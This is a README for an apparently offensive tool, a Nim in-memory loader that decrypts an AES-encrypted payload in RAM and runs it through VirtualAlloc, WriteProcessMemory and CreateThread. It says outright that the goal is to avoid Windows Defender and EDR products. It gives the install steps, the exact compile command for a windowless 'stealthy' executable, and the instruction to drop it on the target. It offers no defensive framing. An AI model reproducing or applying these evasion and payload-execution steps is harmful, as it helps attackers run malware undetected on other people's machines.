# 🏃 The Zencefil Loader (In-Memory Execution)

If you successfully encrypted your payload using `zencefil-weaponizer.py`, you now have a Base64 encoded Key, IV, and Ciphertext. To execute this on a target without alerting Windows Defender or EDRs, you need an **In-Memory Runner**.

This directory contains the `zencefil_runner.nim` script, written in Nim. It is designed to:
1. Hold your encrypted variables.
2. Decrypt the payload entirely in the RAM.
3. Allocate memory (`VirtualAlloc`), copy the payload (`WriteProcessMemory`), and execute it (`CreateThread`).

## Usage
1. Install Nim and the required libraries (`nimble install winim nimcrypto`).
2. Paste your Base64 outputs from the weaponizer into `zencefil_runner.nim`.
3. Compile the runner to a stealthy Windows executable (no console window):
```bash
nim c -d:danger -d:strip --app:gui zencefil_runner.nim
```
4. Drop `zencefil_runner.exe` on the target. Game over.
